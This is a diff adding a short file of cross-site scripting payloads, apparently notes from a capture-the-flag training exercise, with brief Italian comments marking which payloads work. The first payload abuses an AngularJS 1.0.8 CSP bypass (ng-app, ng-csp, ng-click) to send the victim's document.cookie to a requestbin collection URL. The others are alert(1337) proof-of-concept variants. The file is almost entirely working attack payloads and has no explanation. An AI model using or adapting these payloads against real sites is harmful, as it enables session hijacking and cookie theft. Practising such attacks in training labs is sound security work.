@@ -1,0 +1,16 @@
+<a id="this" onLoad="document.getElementById('this').click()" ng-app ng-csp ng-click="$event.view.window.location.href='https://requestbin.training.ctf.necst.it/1ndb9zb1/'%2bdocument.cookie" href="."><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>text</a>
+
+
+
+
+script funzionante:
+<a ng-app ng-csp ng-click="$event.view.alert(1337)" href="https://requestbin.training.ctf.necst.it/1pksjsv1/'%2bdocument.cookie"><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>text</a>
+
+
+
+Funziona l'alert:
+<button ng-app ng-click="$event.view.alert(1337)" class="ng-scope"><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>text</button>
+
+
+
+
